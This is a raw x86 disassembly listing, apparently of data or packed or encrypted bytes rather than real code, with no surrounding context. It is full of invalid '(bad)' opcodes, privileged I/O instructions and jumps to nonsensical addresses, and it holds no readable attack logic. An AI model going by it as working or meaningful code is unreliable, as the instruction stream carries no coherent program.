  40fb6c:	sub    eax,0x8e898993
  40fb71:	push   eax
  40fb72:	pop    edx
  40fb73:	jp     0x40fbc6
  40fb75:	jl     0x40fb5b
  40fb77:	mov    esi,0x420c29ca
  40fb7c:	mov    DWORD PTR [edi+0x60],ecx
  40fb7f:	fdivr  st(0),st
  40fb81:	test   DWORD PTR [eax+0xd],esp
  40fb84:	xchg   ecx,eax
  40fb85:	mov    cs,ebp
  40fb87:	mov    ebx,0x234b0e9a
  40fb8c:	and    al,0x75
  40fb8e:	pop    edi
  40fb8f:	nop
  40fb90:	sub    BYTE PTR [edi+0x520d4f69],ah
  40fb96:	inc    esp
  40fb97:	xchg   ebp,eax
  40fb98:	inc    eax
  40fb99:	mov    ebp,0x7b038593
  40fb9e:	into   
  40fb9f:	aas    
  40fba0:	iret   
  40fba1:	(bad)  
  40fba2:	cmp    eax,0x7aa06829
  40fba7:	aaa    
  40fba8:	retf   
  40fba9:	jecxz  0x40fb89
  40fbab:	aad    0xa2
  40fbad:	mov    dh,0xdf
  40fbaf:	ins    DWORD PTR es:[edi],dx
  40fbb0:	scas   eax,DWORD PTR es:[edi]
  40fbb1:	sbb    dl,BYTE PTR [ebx-0x28]
  40fbb4:	cld    
  40fbb5:	sahf   
  40fbb6:	sar    BYTE PTR [edi-0x7d58459c],cl
  40fbbc:	clc    
  40fbbd:	lds    ebx,FWORD PTR [edi-0x2b127e1c]
  40fbc3:	out    dx,eax
  40fbc4:	arpl   bp,si
  40fbc6:	imul   edi,edx,0xd12337a1
  40fbcc:	pop    ecx
  40fbcd:	bound  edx,QWORD PTR [ecx-0x6e]
  40fbd0:	inc    ebx
  40fbd1:	mov    esp,0xf39ee6af
  40fbd6:	(bad)  
  40fbd7:	push   eax
  40fbd8:	ins    BYTE PTR es:[edi],dx
  40fbd9:	cwde   
  40fbda:	pop    ecx
  40fbdb:	and    BYTE PTR [edi+0x5e3d70e3],0xb8
  40fbe2:	lea    edi,[ecx-0xc]
  40fbe5:	sar    DWORD PTR [ecx-0x24],1
  40fbe8:	cmp    ebx,edx
  40fbea:	fwait
  40fbeb:	inc    eax
  40fbec:	dec    edx
  40fbed:	ss pop edx
  40fbef:	push   esi
  40fbf0:	in     al,0x5e
  40fbf2:	ja     0x40fbd3
  40fbf4:	cmp    ah,BYTE PTR [esi]
  40fbf6:	and    al,bh
  40fbf8:	enter  0x8d89,0xe
  40fbfc:	add    dl,BYTE PTR [ecx+0xd]
  40fbff:	lea    esi,[ebp-0x59]
  40fc02:	adc    al,0x3
  40fc04:	and    dl,BYTE PTR [eax]
  40fc06:	inc    ecx
  40fc07:	fcom   QWORD PTR [ebx+0x4d5cdaed]
  40fc0d:	push   ds
  40fc0e:	pop    esp
  40fc0f:	bound  ebx,QWORD PTR [ecx+0x2cd7e243]
  40fc15:	rol    BYTE PTR [ecx-0x1a],0x42
  40fc19:	sbb    dl,cl
  40fc1b:	mov    ds:0xff418f6e,eax
  40fc20:	outs   dx,BYTE PTR ds:[esi]
  40fc21:	pop    edi
  40fc22:	lds    esi,FWORD PTR [ebp+ecx*8-0x1]
  40fc26:	test   DWORD PTR [ebp-0x38],edx
  40fc29:	mov    esp,0x2404e654
  40fc2e:	and    eax,0xaf693f66
  40fc33:	loopne 0x40fc21
  40fc35:	(bad)  
  40fc36:	mov    al,ds:0xd9cfb6c4
  40fc3b:	test   DWORD PTR [edx+0xe6c541c],ebp
  40fc41:	cdq    
  40fc42:	dec    ebx
  40fc43:	loopne 0x40fc77
  40fc45:	hlt    
  40fc46:	arpl   WORD PTR [eax],dx
  40fc48:	mov    ?,eax
  40fc4a:	jae    0x40fc00
  40fc4c:	push   ebp
  40fc4d:	or     edx,DWORD PTR [edx-0x50]
  40fc50:	fwait
  40fc51:	or     eax,DWORD PTR [ecx-0x1edefd60]
  40fc57:	dec    eax
  40fc58:	pop    ds
  40fc59:	jmp    0x40fc31
  40fc5b:	js     0x40fc3b
  40fc5d:	dec    eax
  40fc5e:	repnz inc ebx
  40fc60:	xchg   esp,eax
  40fc61:	jae    0x40fc69
  40fc63:	jno    0x40fc01
  40fc65:	dec    edx
  40fc66:	mov    WORD PTR [ebp-0x75],gs
  40fc69:	js     0x40fc11
  40fc6b:	imul   ebp,DWORD PTR [ebx+0x43],0x520e63ea
  40fc72:	mov    eax,0xafe6a637
  40fc77:	pop    ds
  40fc78:	cmp    edi,DWORD PTR [edx]
  40fc7a:	jge    0x40fc3c
  40fc7c:	jecxz  0x40fc08
  40fc7e:	adc    bh,0x88
  40fc81:	dec    ebp
  40fc82:	inc    esi
  40fc83:	out    0x7d,al
  40fc85:	mov    ebx,0x58cf8d03
  40fc8a:	mov    bh,0x5
  40fc8c:	aas    
  40fc8d:	or     BYTE PTR [ecx+0xa],ch
  40fc90:	out    0xb1,eax
  40fc92:	mov    eax,0x59621443
  40fc97:	loope  0x40fce7
  40fc99:	xchg   esp,eax
  40fc9a:	pop    ebx
  40fc9b:	mov    WORD PTR [eax+0x5aa944d3],ss
  40fca1:	mov    eax,0x85a90a87
  40fca6:	mov    ebp,0x8fffc149
  40fcab:	pop    ebx
  40fcac:	(bad)  
  40fcad:	ret    
  40fcae:	dec    edx
  40fcaf:	aas    
  40fcb0:	retf   
  40fcb1:	not    cl
  40fcb3:	mov    es,esi
  40fcb5:	sub    ebx,DWORD PTR [edi-0x3b]
  40fcb8:	inc    DWORD PTR [esi]
  40fcba:	mov    esp,0x5973643a
  40fcbf:	xchg   esi,eax
  40fcc0:	aaa    
  40fcc1:	icebp  
  40fcc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc3:	jmp    0x8e24b8b2
  40fcc8:	xlat   BYTE PTR ds:[ebx]
  40fcc9:	repz pop ds
  40fccb:	sub    edx,DWORD PTR [ebp-0x77e6e29]
  40fcd1:	mov    bh,0xcd
  40fcd3:	xchg   edi,eax
  40fcd4:	dec    ebx
  40fcd5:	(bad)  
  40fcd7:	mov    edi,0x2d498b7b
  40fcdc:	ss inc edx
  40fcde:	cmc    
  40fcdf:	call   0x64ca:0x1265456c
  40fce6:	out    0x4d,al
  40fce8:	pop    ss
  40fce9:	jnp    0x40fcfc
  40fceb:	lds    edx,FWORD PTR [ecx+0x26]
  40fcee:	ins    DWORD PTR es:[edi],dx
  40fcef:	ffree  st(6)
  40fcf1:	push   ebx
  40fcf2:	sbb    ebx,edi
  40fcf4:	and    eax,0x43247a26
  40fcf9:	xlat   BYTE PTR ds:[ebx]
  40fcfa:	mov    edx,0xd3380c4
  40fcff:	out    0x2b,al
  40fd01:	test   ch,bh
  40fd03:	fiadd  WORD PTR [ebp+0x794dd010]
  40fd09:	das    
  40fd0a:	test   DWORD PTR [eax+ebp*4],0x65aec4d0
  40fd11:	xor    bh,BYTE PTR [ecx+0x9]
  40fd14:	mov    cl,0x68
  40fd16:	in     eax,dx
  40fd17:	adc    eax,0x7297258f
  40fd1c:	int3   
  40fd1d:	iret   
  40fd1e:	jb     0x40fccb
  40fd20:	adc    DWORD PTR ds:0x7f0ff5b1,esp
  40fd26:	not    cl
  40fd28:	mov    bh,0x20
  40fd2a:	scas   al,BYTE PTR es:[edi]
  40fd2b:	and    BYTE PTR [ebx-0x44f75234],dl
  40fd31:	inc    eax
  40fd32:	xchg   DWORD PTR [ecx+0x5d],ebx
  40fd35:	clc    
  40fd36:	and    eax,0xb4de5008
  40fd3b:	in     al,0xdc
  40fd3d:	ja     0x40fd1e
  40fd3f:	pop    ebx
  40fd40:	push   ebx
  40fd41:	imul   edi,DWORD PTR [ecx],0xffffffe4
  40fd44:	rcr    BYTE PTR [eax-0x35],cl
  40fd47:	popf   
  40fd48:	xchg   edx,eax
  40fd49:	mov    eax,0x259a9825
  40fd4e:	sub    eax,0x1e49f3af
  40fd53:	shl    BYTE PTR [ecx-0x4d8c5ed8],0x3d
  40fd5a:	repz mov ah,0x83
  40fd5d:	in     eax,0x7b
  40fd5f:	or     eax,0xd6e62932
  40fd64:	push   0x64
  40fd66:	pop    eax
  40fd67:	dec    esp
  40fd68:	les    edx,FWORD PTR [ecx]
  40fd6a:	inc    edx
  40fd6b:	hlt    
  40fd6c:	mov    dh,0x6
  40fd6e:	jp     0x40fdd7
  40fd70:	add    eax,0xdb3daab3
  40fd75:	push   esp
  40fd76:	iret   
  40fd77:	in     eax,0xd3
  40fd79:	setno  BYTE PTR [edi+0x47]
  40fd7d:	inc    edi
  40fd7e:	xchg   esi,eax
  40fd7f:	xchg   esp,eax
  40fd80:	leave  
  40fd81:	cld    
  40fd82:	cli    
  40fd83:	stos   BYTE PTR es:[edi],al
  40fd84:	loope  0x40fd7a
  40fd86:	pop    edi
  40fd87:	inc    ebx
  40fd88:	or     DWORD PTR [edx+0x6c9cf68b],edi
  40fd8e:	or     al,0x2e
  40fd90:	outs   dx,DWORD PTR ds:[esi]
  40fd91:	or     eax,0x8547349a
  40fd96:	cli    
  40fd97:	adc    esi,DWORD PTR [esi-0x2e]
  40fd9a:	out    0xa0,al
  40fd9c:	adc    dl,BYTE PTR [ebx]
  40fd9e:	mov    bl,0x21
  40fda0:	dec    ecx
  40fda1:	test   BYTE PTR [edx-0x2a],bl
  40fda4:	in     al,dx
  40fda5:	cmp    ecx,ecx
  40fda7:	add    eax,0xbf42fbc4
  40fdac:	scas   al,BYTE PTR es:[edi]
  40fdad:	leave  
  40fdae:	aaa    
  40fdaf:	jb     0x40fd53
  40fdb1:	inc    edx
  40fdb2:	into   
  40fdb3:	cld    
  40fdb4:	xor    eax,0xcb28b47c
  40fdb9:	nop
  40fdba:	pop    ebx
  40fdbb:	adc    al,0xbf
  40fdbd:	push   edx
  40fdbe:	push   esi
  40fdbf:	xchg   BYTE PTR [edi-0x1731cb6],al
  40fdc5:	imul   eax,esp,0x11
  40fdc8:	icebp  
  40fdc9:	sahf   
  40fdca:	sbb    DWORD PTR [ebp+0x2f2f7a0a],edi
  40fdd0:	add    bh,BYTE PTR [esi-0x41a3d7eb]
  40fdd6:	cdq    
  40fdd7:	aas    
  40fdd8:	lahf   
  40fdd9:	pop    edx
  40fdda:	fmul   DWORD PTR [ecx-0x7a]
  40fddd:	mov    ecx,0xfb6ea7c1
  40fde2:	mov    esi,0x328497f
  40fde7:	and    bl,BYTE PTR [esi]
  40fde9:	int    0x7d
  40fdeb:	(bad)  
  40fdec:	jp     0x40fdb2
  40fdee:	loope  0x40fe5a
  40fdf0:	(bad)  
  40fdf1:	cli    
  40fdf2:	inc    ebx
  40fdf3:	cs push ebx
  40fdf5:	out    0xf5,al
  40fdf7:	idiv   DWORD PTR [esi+0x75e0d41f]
  40fdfd:	xchg   esi,eax
  40fdfe:	cmp    al,0xdc
  40fe00:	and    al,0xa0
  40fe02:	pushf  
  40fe03:	fcom   st(7)
  40fe05:	mov    al,ds:0x5602f7b3
  40fe0a:	dec    edx
  40fe0b:	std    
  40fe0c:	cmp    DWORD PTR [edi+0x55068439],ebx
  40fe12:	(bad)  
  40fe13:	aaa    
  40fe14:	ds es mov edx,0x1fe7823d
  40fe1b:	jo     0x40fe35
  40fe1d:	pusha  
  40fe1e:	cmp    BYTE PTR es:[esi+0x981d6b0],cl
  40fe25:	cmp    dl,BYTE PTR [ecx+0x595a5e39]
  40fe2b:	leave  
  40fe2c:	jmp    0x40fe5c
  40fe2e:	jno    0x40fe92
  40fe30:	mov    dl,0xb2
  40fe32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe33:	lods   eax,DWORD PTR ds:[esi]
  40fe34:	scas   eax,DWORD PTR es:[edi]
  40fe35:	push   es
  40fe36:	loope  0x40fe91
  40fe38:	mov    bh,0xf8
  40fe3a:	dec    ecx
  40fe3b:	jnp    0x40fe59
  40fe3d:	mov    ds:0xe3210194,eax
  40fe42:	sbb    DWORD PTR [edi],0x29ecd120
  40fe48:	in     al,dx
  40fe49:	enter  0x76c0,0x7e
  40fe4d:	cmp    cl,ah
  40fe4f:	lods   al,BYTE PTR ds:[esi]
  40fe50:	ret    
  40fe51:	jo     0x40fe81
  40fe53:	xor    DWORD PTR [edi-0x50140c46],ebp
  40fe59:	sub    edi,edi
  40fe5b:	mov    bh,bl
  40fe5d:	out    dx,al
  40fe5e:	out    dx,al
  40fe5f:	aaa    
  40fe60:	std    
  40fe61:	mov    ecx,0x97bdca1d
  40fe66:	dec    esi
  40fe67:	mov    ah,0x40
  40fe69:	dec    ebx
  40fe6a:	(bad)  [ebx+0x6a]
  40fe6d:	jp     0x40fe9b
  40fe6f:	or     BYTE PTR [bx+si-0x49],dl
  40fe73:	imul   ecx,ebx,0x89efcc52
  40fe79:	sub    cl,BYTE PTR [ecx-0x1909ddee]
  40fe7f:	lock xchg ebx,eax
  40fe81:	jp     0x40fe0b
  40fe83:	data16 jnp 0x40feb4
  40fe86:	fldpi  
  40fe88:	or     esi,ecx
  40fe8a:	iret   
  40fe8b:	hlt    
  40fe8c:	clc    
  40fe8d:	xchg   BYTE PTR [edi-0x7dc281b0],ah
  40fe93:	imul   edx,DWORD PTR [ebx+0x55bb5c16],0x265bfef3
  40fe9d:	jbe    0x40febe
  40fe9f:	icebp  
  40fea0:	and    ebx,esp
  40fea2:	inc    esp
  40fea3:	sbb    ah,BYTE PTR [ebp+0x7a]
  40fea6:	(bad)  
  40fea7:	loop   0x40fea3
  40fea9:	cwde   
  40feaa:	pop    ebx
  40feab:	cli    
  40feac:	out    dx,eax
  40fead:	inc    edi
  40feae:	jns    0x40feff
  40feb0:	adc    esi,DWORD PTR ds:0xa8851c06
  40feb6:	not    BYTE PTR [ecx-0x2ba74449]
  40febc:	xchg   ecx,eax
  40febd:	sub    eax,0x3b80de1c
  40fec2:	aaa    
  40fec3:	mov    esi,0x550f457e
  40fec8:	or     al,BYTE PTR [edx]
  40feca:	jge    0x40fef9
  40fecc:	sub    edi,eax
  40fece:	iret   
  40fecf:	inc    edi
  40fed0:	mov    edx,0x2998e153
  40fed5:	fild   DWORD PTR [ebp+0x1ff0fe7a]
  40fedb:	add    al,0x28
  40fedd:	xor    DWORD PTR [eax+edi*8-0x204e1958],ecx
  40fee4:	retf   
  40fee5:	pop    esp
  40fee6:	popf   
  40fee7:	fldenv [edx]
  40fee9:	mov    esi,0xc15a3788
  40feee:	jge    0x40fedd
  40fef0:	leave  
  40fef1:	lea    ebx,[ecx]
  40fef3:	adc    eax,0x7d4b6e1c
  40fef8:	or     ecx,ecx
  40fefa:	ja     0x40feff
  40fefc:	and    al,0x48
  40fefe:	loopne 0x40feed
  40ff00:	xor    BYTE PTR [ebx+eiz*2-0x737e6399],bl
  40ff07:	mov    DWORD PTR [ebp-0x5f],ebx
  40ff0a:	xchg   esp,eax
  40ff0b:	or     dl,BYTE PTR [ebx]
  40ff0d:	inc    esp
  40ff0e:	ds ins BYTE PTR es:[edi],dx
  40ff10:	add    eax,0xfc0824a9
  40ff15:	xor    DWORD PTR [eax+edi*1+0xda3402d],edi
  40ff1c:	mov    ecx,0x50daa0ab
  40ff21:	or     bh,dh
  40ff23:	std    
  40ff24:	mul    ch
  40ff26:	cmc    
  40ff27:	ins    DWORD PTR es:[edi],dx
  40ff28:	pusha  
  40ff29:	push   edx
  40ff2a:	iret   
  40ff2b:	adc    al,BYTE PTR [eax]
  40ff2d:	int3   
  40ff2e:	jae    0x40ff21
  40ff30:	rcl    BYTE PTR [edx-0x3],1
  40ff33:	mov    edi,0x289c93c8
  40ff38:	mov    al,0xd5
  40ff3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff3b:	iret   
  40ff3c:	sub    eax,0x3147e7e
  40ff41:	mov    ds:0x3ade9bf3,al
  40ff46:	cmp    dl,BYTE PTR [esi-0x65]
  40ff49:	ficom  WORD PTR [edx-0xb]
  40ff4c:	cs push ebx
  40ff4e:	fstp   TBYTE PTR [edx+0x215148d0]
  40ff54:	xor    cl,dh
  40ff56:	test   al,0xf5
  40ff58:	imul   eax,edx,0x7e
  40ff5b:	outs   dx,DWORD PTR ds:[esi]
  40ff5c:	ffree  st(7)
  40ff5e:	mov    WORD PTR ds:0x6207d8d1,cs
  40ff64:	dec    edi
  40ff65:	(bad)  
  40ff66:	(bad)  
  40ff67:	xor    al,BYTE PTR [edx+0x12]
  40ff6a:	int    0xa7
  40ff6c:	add    cl,BYTE PTR [esi]
  40ff6e:	sbb    eax,0x456e8c87
  40ff73:	ret    
  40ff74:	push   es
  40ff75:	jge    0x40fff4
  40ff77:	loope  0x40ffac
  40ff79:	in     eax,0xd7
  40ff7b:	jge    0x40ffdf
  40ff7d:	jmp    0xb5393dcf
  40ff82:	popf   
  40ff83:	repnz or BYTE PTR [edx-0x61db189d],cl
  40ff8a:	sbb    al,0x7a
  40ff8c:	sbb    eax,0x3c280f05
  40ff91:	adc    esi,esp
  40ff93:	les    edx,FWORD PTR [esi+ecx*2-0x690e79c1]
  40ff9a:	or     DWORD PTR [ebx-0x1c],edi
  40ff9d:	out    dx,al
  40ff9e:	jnp    0x40fff9
  40ffa0:	adc    eax,0xa957ac73
  40ffa5:	mov    ebx,DWORD PTR [ecx-0x57]
  40ffa8:	(bad)  
  40ffa9:	ins    BYTE PTR es:[edi],dx
  40ffaa:	push   eax
  40ffab:	xchg   DWORD PTR [esi-0x177490d1],ecx
  40ffb1:	sbb    eax,0x759ec718
  40ffb6:	xlat   BYTE PTR ds:[ebx]
  40ffb7:	and    BYTE PTR [edx-0x54],0x30
  40ffbb:	rol    BYTE PTR [esi+eiz*8],1
  40ffbe:	pop    ds
  40ffbf:	test   BYTE PTR [eax+0x6989ff9d],bh
  40ffc5:	jae    0x40ff79
  40ffc7:	(bad)  
  40ffc8:	pop    ebp
  40ffc9:	pop    esp
  40ffca:	xchg   esp,eax
  40ffcb:	mov    edx,0x5a60c909
  40ffd0:	xchg   edx,eax
  40ffd1:	push   ss
  40ffd2:	cmp    eax,0xffffffc0
  40ffd5:	loop   0x410010
  40ffd7:	outs   dx,BYTE PTR ds:[esi]
  40ffd8:	dec    ebx
  40ffd9:	xchg   esi,eax
  40ffda:	sbb    eax,0x6f0cf1e3
  40ffdf:	daa    
  40ffe0:	(bad)  
  40ffe2:	pop    ebp
  40ffe3:	xor    eax,0x9bd1d6f7
  40ffe8:	rol    DWORD PTR [edi+0xf],1
  40ffeb:	aad    0x3d
  40ffed:	jb     0x410059
  40ffef:	scas   al,BYTE PTR es:[edi]
  40fff0:	mov    ch,dl
  40fff2:	inc    ebp
  40fff3:	in     al,dx
  40fff4:	shr    BYTE PTR [eax],0x59
  40fff7:	push   esp
  40fff8:	sub    eax,0xa524b3d9
  40fffd:	mov    ds:0xc78b788b,eax
  410002:	js     0x41000a
  410004:	pop    ds
  410005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410006:	loopne 0x41001e
  410008:	ins    DWORD PTR es:[edi],dx
  410009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41000a:	hlt    
  41000b:	xchg   edi,eax
  41000c:	xor    al,0x84
  41000e:	sub    edi,ecx
  410010:	repnz pop edi
  410012:	add    DWORD PTR [ebp-0x57],0xffffffc5
  410016:	(bad)  
  410018:	xor    al,0x15
  41001a:	sbb    BYTE PTR [esi-0x29],ch
  41001d:	(bad)  
  41001e:	(bad)  
  41001f:	aam    0x22
  410021:	mov    bl,0x6f
  410023:	int    0x92
  410025:	aad    0x46
  410027:	add    bl,0x62
  41002a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41002b:	sbb    al,0x54
  41002d:	retf   0xe356
  410030:	jge    0x410024
  410032:	icebp  
  410033:	test   edx,ebx
  410035:	add    eax,0x89c8924
  41003a:	jne    0x410028
  41003c:	sbb    eax,0x5d4c01d7
  410041:	mov    ds:0x4d93a09d,eax
  410046:	mov    ecx,0x6a3fec64
  41004b:	leave  
  41004c:	jns    0x4100c7
  41004e:	jle    0x41001c
  410050:	(bad)  
  410051:	xchg   esp,eax
  410052:	bnd jo 0x4100a0
  410055:	fbstp  TBYTE PTR [edi+eax*8]
  410058:	sbb    BYTE PTR [ebp+0x637b5ebd],bh
  41005e:	(bad)  
  41005f:	iret   
  410060:	push   esi
  410061:	sahf   
  410062:	sbb    edi,DWORD PTR [ebp+0x64]
  410065:	or     ebx,DWORD PTR [edx+0x3f]
  410068:	bnd jle 0x410037
  41006b:	ret    0x535e
  41006e:	stos   BYTE PTR es:[edi],al
  41006f:	dec    edi
  410070:	inc    esp
  410071:	test   BYTE PTR [eax],al
  410073:	out    0xe1,al
  410075:	mov    ah,0x62
  410077:	es loopne 0x4100be
  41007a:	loopne 0x4100cd
  41007c:	repz push ds
  41007e:	add    ecx,eax
  410080:	and    ebx,DWORD PTR [esp+eax*2-0x48068fef]
  410087:	sub    al,0xd6
  410089:	ret    0x6c17
  41008c:	sbb    esi,edi
  41008e:	outs   dx,DWORD PTR ds:[esi]
  41008f:	mov    ds:0xbad23dba,eax
  410094:	in     al,dx
  410095:	inc    ebp
  410096:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  410098:	(bad)  
  410099:	(bad)  
  41009a:	iret   
  41009b:	int3   
  41009c:	adc    al,0x82
  41009e:	(bad)  [ebx-0x4a46830d]
  4100a4:	(bad)  
  4100a5:	(bad)  
  4100a6:	shr    DWORD PTR [ecx-0x9],1
  4100a9:	out    0xfe,eax
  4100ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100ac:	scas   eax,DWORD PTR es:[edi]
  4100ad:	jbe    0x4100d4
  4100af:	mov    ebp,0x2650fc22
  4100b4:	mov    ch,0xa8
  4100b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100b7:	xor    edx,DWORD PTR fs:[ebp-0x1c7f30b1]
  4100be:	lods   al,BYTE PTR ds:[esi]
  4100bf:	rcr    BYTE PTR [esi+0x55],1
  4100c2:	pop    ss
  4100c3:	add    eax,0xa9ab720d
  4100c8:	sub    ebp,DWORD PTR [esi+0x75ef2823]
  4100ce:	mov    ch,0xb9
  4100d0:	xlat   BYTE PTR ds:[ebx]
  4100d1:	xlat   BYTE PTR ds:[ebx]
  4100d2:	jmp    DWORD PTR [edi-0x4c]
  4100d5:	jb     0x4100d0
  4100d7:	fcom   st(2)
  4100d9:	sti    
  4100da:	test   BYTE PTR [ebp+0x28],ch
  4100dd:	mov    dl,0xcb
  4100df:	shl    BYTE PTR [edi+edx*1],1
  4100e2:	and    BYTE PTR [eax],bh
  4100e4:	loopne 0x410124
  4100e6:	shl    dl,0x2a
  4100e9:	jmp    0x410149
  4100eb:	adc    esp,esp
  4100ed:	mov    ds:0xdf889e89,eax
  4100f2:	stos   DWORD PTR es:[edi],eax
  4100f3:	dec    edx
  4100f4:	fwait
  4100f5:	shl    DWORD PTR [ebp+0x1c],cl
  4100f8:	out    dx,al
  4100f9:	psrad  mm5,mm6
  4100fc:	adc    bh,BYTE PTR [edi+0x787173cf]
  410102:	cwde   
  410103:	dec    edi
  410104:	cmp    ah,dl
  410106:	test   eax,0x468057c0
  41010b:	pop    edi
  41010c:	dec    ecx
  41010d:	or     al,0x5a
  41010f:	sub    ch,BYTE PTR [edi+0x3b]
  410112:	push   ss
  410113:	ret    
  410114:	mov    al,0x25
  410116:	(bad)  
  410117:	mov    edi,0x300c561c
  41011c:	sub    DWORD PTR [ebp-0x61e60420],esi
  410122:	cmp    eax,0x48d1a56b
  410127:	dec    ebp
  410128:	dec    eax
  410129:	sbb    al,0x1e
  41012b:	pushf  
  41012c:	sub    al,0x27
  41012e:	std    
  41012f:	or     al,BYTE PTR [eax-0x2880bd6d]
  410135:	mov    WORD PTR [ecx-0x65b32019],es
  41013b:	gs out dx,eax
  41013d:	lock adc DWORD PTR [esi+0x8],edx
  410141:	out    0x2f,eax
  410143:	sub    eax,0xa7095799
  410148:	inc    edi
  410149:	arpl   WORD PTR [edx-0x1d],sp
  41014c:	das    
  41014d:	fcom   DWORD PTR [ebx-0x29]
  410150:	or     BYTE PTR [edi-0x5b25ef],0x4e
  410157:	mov    bl,bh
  410159:	mov    ebx,0xd45f8fc8
  41015e:	gs es push ebx
  410161:	xchg   esi,eax
  410162:	add    cl,BYTE PTR [ecx]
  410164:	test   DWORD PTR [ecx+0x174cd0f2],0x92a77420
  41016e:	iret   
  41016f:	test   al,0xa4
  410171:	xchg   esi,eax
  410172:	aaa    
  410173:	inc    esp
  410174:	xor    al,BYTE PTR [ebx-0x6f]
  410177:	xlat   BYTE PTR ds:[ebx]
  410178:	repz imul edi,edx,0x3c6df41
  41017f:	addr16 pop eax
  410181:	(bad)  
  410182:	cmc    
  410183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410184:	mov    DWORD PTR [edi-0x7c],ecx
  410187:	into   
  410188:	lods   al,BYTE PTR cs:[esi]
  41018a:	mov    al,0xc
  41018c:	cmp    ecx,DWORD PTR [ecx]
  41018e:	or     ebx,esi
  410190:	or     bh,ah
  410192:	push   ecx
  410193:	sbb    DWORD PTR [eax+ebp*4],esp
  410196:	xchg   edi,eax
  410197:	ret    
  410198:	cmp    eax,0x6e823431
  41019d:	int    0xbc
  41019f:	pop    ds
  4101a0:	jns    0x410173
  4101a2:	inc    ecx
  4101a3:	lods   eax,DWORD PTR ds:[esi]
  4101a4:	arpl   WORD PTR [esi],bp
  4101a6:	dec    edi
  4101a7:	js     0x41016b
  4101a9:	scas   eax,DWORD PTR es:[edi]
  4101aa:	stos   BYTE PTR es:[edi],al
  4101ab:	inc    eax
  4101ac:	popf   
  4101ad:	out    0xfe,eax
  4101af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101b0:	sar    BYTE PTR [ecx-0x34d91b3a],1
  4101b6:	neg    DWORD PTR [esi+0x53]
  4101b9:	test   eax,0x34ec2ae1
  4101be:	push   ecx
  4101bf:	mov    eax,0x1c63f4fb
  4101c4:	sar    DWORD PTR [esi-0x16df0df1],0xdf
  4101cb:	mov    ah,0xb7
  4101cd:	cmp    BYTE PTR [ecx+0x6322ec7f],0x50
  4101d4:	cld    
  4101d5:	pop    ebp
  4101d6:	dec    edi
  4101d7:	mov    ecx,DWORD PTR [edi+eiz*8]
  4101da:	mov    ecx,0x63004279
  4101df:	mov    esi,0x37565089
  4101e4:	enter  0xa31,0x9f
  4101e8:	cs jne 0x4101b5
  4101eb:	push   ss
  4101ec:	sar    DWORD PTR [ebx],0xce
  4101ef:	ret    
  4101f0:	(bad)  
  4101f1:	jnp    0x4101ef
  4101f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101f4:	adc    edx,DWORD PTR [edi-0x74b69405]
  4101fa:	jecxz  0x410212
  4101fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101fd:	mov    esp,0xeb8f49ec
  410202:	jo     0x4101fa
  410204:	adc    DWORD PTR [ebx-0x51],ebp
  410207:	dec    eax
  410208:	add    al,0x21
  41020a:	pop    esi
  41020b:	dec    esi
  41020c:	or     eax,0x78ef2498
  410211:	rol    DWORD PTR [edi+0x2aad28],0xdc
  410218:	popf   
  410219:	pushf  
  41021a:	mov    ecx,DWORD PTR [edx]
  41021c:	xor    dl,0xfa
  41021f:	out    0x1f,eax
  410221:	les    ebp,FWORD PTR [esi-0x23ec8e67]
  410227:	mov    bl,0xa3
  410229:	cli    
  41022a:	jb     0x4101f3
  41022c:	mov    ch,0xaa
  41022e:	push   ds
  41022f:	sub    eax,0x6bdb5727
  410234:	jb     0x41020c
  410236:	mov    eax,ds:0xddd7bfce
  41023b:	adc    bh,cl
  41023d:	or     eax,0x67dfcd2a
  410242:	fwait
  410243:	adc    al,BYTE PTR [esi+0x21]
  410246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410247:	test   eax,0x27c38bad
  41024c:	stos   BYTE PTR es:[edi],al
  41024d:	xor    BYTE PTR [esi+0x2907e8ac],dh
  410253:	xchg   DWORD PTR [esi+0x1ff6bf43],ecx
  410259:	jae    0x4101e3
  41025b:	push   ecx
  41025c:	add    BYTE PTR [ebp+esi*4-0x59],ah
  410260:	pmulhw mm3,QWORD PTR [ebp+0x51]
  410264:	ja     0x410211
  410266:	push   edx
  410268:	xor    esp,ecx
  41026a:	or     esp,DWORD PTR [ecx]
  41026c:	pop    esi
  41026d:	or     eax,DWORD PTR [esi-0x48]
  410270:	mov    eax,0xba2d074d
  410275:	idiv   BYTE PTR [esi+ecx*1]
  410278:	scas   al,BYTE PTR es:[edi]
  410279:	xchg   edi,eax
  41027a:	iret   
  41027b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41027c:	aaa    
  41027d:	cmp    edi,esp
  41027f:	sahf   
  410280:	xor    DWORD PTR [esi+0x5a],esi
  410283:	inc    ecx
  410284:	mov    eax,ds:0xc30f425a
  410289:	xchg   esp,eax
  41028a:	(bad)  
  41028b:	ja     0x4102b6
  41028d:	in     eax,dx
  41028e:	lods   eax,DWORD PTR ds:[esi]
  41028f:	in     al,0xfb
  410291:	adc    eax,0xc6dfef2a
  410296:	sub    DWORD PTR [ecx+0x1cd55c91],ebx
  41029c:	vpcmpeqd ymm2,ymm2,YMMWORD PTR [edi+0x51]
  4102a1:	jnp    0x410302
  4102a3:	jl     0x41025c
  4102a5:	imul   edx,DWORD PTR [ecx-0x4f],0x6a
  4102a9:	ficomp WORD PTR [ebp+0x451c6122]
  4102af:	jb     0x41027f
  4102b1:	dec    edx
  4102b2:	scas   al,BYTE PTR es:[edi]
  4102b3:	and    eax,0x78934f17
  4102b8:	je     0x41032e
  4102ba:	in     al,0x7a
  4102bc:	cdq    
  4102bd:	rcl    eax,cl
  4102bf:	test   eax,0x33be2e9c
  4102c4:	xchg   edx,eax
  4102c5:	jmp    0x4223f24f
